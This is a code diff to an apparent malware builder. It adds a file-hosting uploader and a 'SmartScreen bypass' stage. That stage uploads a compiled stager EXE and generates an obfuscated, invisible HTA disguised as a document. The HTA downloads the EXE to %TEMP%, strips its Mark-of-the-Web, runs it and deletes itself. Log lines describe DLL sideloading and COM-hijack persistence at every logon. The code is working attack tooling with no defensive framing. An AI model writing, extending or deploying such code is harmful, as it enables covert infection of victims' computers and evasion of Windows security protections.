@@ -1019,6 +1019,7 @@ def generate_stager_source(asm, bytecode, sandbox=True):
 # ============================================================
 
 class LitterboxAPI:
+    """Temporary file hosting (catbox litterbox) — max ~50MB, auto-expires."""
     API_URL = "https://litterbox.catbox.moe/resources/internals/api.php"
 
     def __init__(self, retention="24h", retries=3, delay=5):
@@ -1034,7 +1035,39 @@ class LitterboxAPI:
                 with open(fpath, "rb") as f:
                     files = {"fileToUpload": f}
                     data = {"reqtype": "fileupload", "time": self.retention}
-                    resp = requests.post(self.API_URL, data=data, files=files, timeout=60)
+                    resp = requests.post(self.API_URL, data=data, files=files, timeout=120)
+                    resp.raise_for_status()
+                    result = resp.text.strip()
+                    if result.startswith("http"):
+                        return result
+                    raise Exception(f"Invalid response: {result}")
+            except Exception:
+                if attempt < self.retries - 1:
+                    time.sleep(self.delay)
+                else:
+                    raise
+        raise Exception("Upload failed")
+
+
+class CatboxAPI:
+    """Permanent file hosting (catbox.moe) — max 200MB, no expiry."""
+    API_URL = "https://catbox.moe/user/api.php"
+
+    def __init__(self, retries=3, delay=5):
+        self.retries = retries
+        self.delay = delay
+
+    def upload(self, fpath, upload_name=None):
+        if not os.path.exists(fpath):
+            raise FileNotFoundError(f"File not found: {fpath}")
+        if upload_name is None:
+            upload_name = os.path.basename(fpath)
+        for attempt in range(self.retries):
+            try:
+                with open(fpath, "rb") as f:
+                    files = {"fileToUpload": (upload_name, f, "application/octet-stream")}
+                    data = {"reqtype": "fileupload"}
+                    resp = requests.post(self.API_URL, data=data, files=files, timeout=180)
                     resp.raise_for_status()
                     result = resp.text.strip()
                     if result.startswith("http"):
@@ -1168,6 +1201,107 @@ def stage_generate_stager(payload_url, xor_key, rc4_key, sandbox=True):
         log("Anti-analysis: CPU check, timing check (no flagged APIs)", "OK")
     log(f"VM opcodes randomized, {random.randint(4,6)} fake handlers injected", "OK")
     return tmpdir
+
+
+# ============================================================
+# STAGE 5 — SmartScreen bypass: upload stager, generate HTA launcher
+# ============================================================
+
+def stage_smartscreen_bypass(stager_exe_path):
+    """Upload compiled stager EXE to staging, generate HTA that downloads it
+    with MOTW stripped so SmartScreen never triggers.
+
+    mshta.exe is a signed Microsoft LOLBAS binary — no SmartScreen on HTA.
+    The HTA downloads the EXE to %TEMP%, removes the Zone.Identifier ADS
+    (Mark-of-the-Web), executes it, then self-deletes.
+    """
+    if not os.path.exists(stager_exe_path):
+        raise Exception(f"Stager EXE not found: {stager_exe_path}")
+
+    # Upload stager EXE to catbox as .bin (catbox blocks .exe extension)
+    # HTA saves it back as .exe on the target
+    catbox = CatboxAPI()
+    log("Uploading stager EXE to staging...")
+    upload_name = rand_id(8, 12) + ".bin"
+    stager_url = catbox.upload(stager_exe_path, upload_name=upload_name)
+    log("Stager uploaded", "OK")
+
+    # Randomized filenames per build
+    exe_drop_name = rand_id(6, 10) + ".exe"
+    hta_name = "Document_" + str(random.randint(1000, 9999)) + ".hta"
+
+    # Obfuscate the URL and strings in the HTA using VBScript chr() encoding
+    def vb_obf_str(s):
+        """Encode string as VBScript Chr() concatenation."""
+        parts = [f"Chr({ord(c)})" for c in s]
+        groups = []
+        for i in range(0, len(parts), 8):
+            groups.append("&".join(parts[i:i + 8]))
+        return "&".join(groups)
+
+    # Randomize VBScript variable names
+    v_url = rand_id(3, 6)
+    v_xhr = rand_id(3, 6)
+    v_stream = rand_id(3, 6)
+    v_path = rand_id(3, 6)
+    v_shell = rand_id(3, 6)
+    v_fso = rand_id(3, 6)
+    v_temp = rand_id(3, 6)
+    v_ads = rand_id(3, 6)
+    v_hta = rand_id(3, 6)
+
+    bs = chr(92)  # backslash
+
+    # Build the HTA — invisible window, auto-runs, auto-closes
+    hta_content = f"""<html>
+<head><title> </title>
+<HTA:APPLICATION ID="x" BORDER="none" SHOWINTASKBAR="no"
+ SYSMENU="no" CAPTION="no" MAXIMIZEBUTTON="no" MINIMIZEBUTTON="no"
+ WINDOWSTATE="minimize" />
+</head>
+<body>
+<script language="VBScript">
+Sub window_onload()
+  window.resizeTo 0,0
+  window.moveTo -4000,-4000
+  Dim {v_url},{v_xhr},{v_stream},{v_path},{v_shell},{v_fso},{v_temp},{v_ads},{v_hta}
+  {v_url} = {vb_obf_str(stager_url)}
+  Set {v_shell} = CreateObject({vb_obf_str("WScript.Shell")})
+  {v_temp} = {v_shell}.ExpandEnvironmentStrings({vb_obf_str("%TEMP%")})
+  {v_path} = {v_temp} & Chr(92) & {vb_obf_str(exe_drop_name)}
+  Set {v_xhr} = CreateObject({vb_obf_str("Msxml2.XMLHTTP")})
+  {v_xhr}.Open {vb_obf_str("GET")}, {v_url}, False
+  {v_xhr}.Send
+  If {v_xhr}.Status = 200 Then
+    Set {v_stream} = CreateObject({vb_obf_str("Adodb.Stream")})
+    {v_stream}.Open
+    {v_stream}.Type = 1
+    {v_stream}.Write {v_xhr}.responseBody
+    {v_stream}.SaveToFile {v_path}, 2
+    {v_stream}.Close
+    {v_ads} = {v_path} & {vb_obf_str(":Zone.Identifier")}
+    Set {v_fso} = CreateObject({vb_obf_str("Scripting.FileSystemObject")})
+    On Error Resume Next
+    {v_fso}.DeleteFile {v_ads}, True
+    On Error GoTo 0
+    {v_shell}.Run Chr(34) & {v_path} & Chr(34), 0, False
+  End If
+  {v_hta} = document.location.pathname
+  On Error Resume Next
+  CreateObject({vb_obf_str("Scripting.FileSystemObject")}).DeleteFile {v_hta}, True
+  On Error GoTo 0
+  self.close
+End Sub
+</script>
+</body>
+</html>"""
+
+    hta_path = os.path.join(os.getcwd(), hta_name)
+    with open(hta_path, "w", encoding="utf-8") as f:
+        f.write(hta_content)
+    log(f"HTA launcher: {hta_name} ({len(hta_content)} bytes)", "OK")
+
+    return hta_name, stager_url
 
 
 # ============================================================
@@ -1411,11 +1545,22 @@ def main():
             log("\n--- Stage 4: Compile Stager → EXE ---")
             stage_compile_stager(stager_dir, output_name)
 
+            # STAGE 5: SmartScreen bypass — upload EXE, generate HTA launcher
+            log("\n--- Stage 5: SmartScreen Bypass (HTA + MOTW strip) ---")
+            stager_exe_path = os.path.join(os.getcwd(), output_name)
+            hta_name, stager_url = stage_smartscreen_bypass(stager_exe_path)
+
+            # Clean up the local EXE — the HTA downloads it from staging
+            os.remove(stager_exe_path)
+            log(f"Removed local {output_name} (delivered via HTA now)", "OK")
+
             print()
             log("=== DLL Sideload Pipeline Complete ===", "OK")
-            log(f"Output: {output_name} (run it — everything is automatic)", "OK")
-            log("Flow: EXE → downloads DLL → drops + hides → COM hijack → rundll32 LOLBAS", "OK")
+            log(f"Output: {hta_name} (double-click — zero SmartScreen)", "OK")
+            log("Flow: HTA (mshta.exe) → downloads EXE → strips MOTW → runs stager", "OK")
+            log("      → stager downloads DLL → drops + hides → COM hijack → rundll32", "OK")
             log("Persistence: explorer.exe loads DLL via COM on every logon", "OK")
+            log(f"No SmartScreen: mshta.exe is signed Microsoft, MOTW stripped from EXE", "OK")
         except Exception as e:
             log(f"Stopped: {e}", "ERR")
             sys.exit(1)
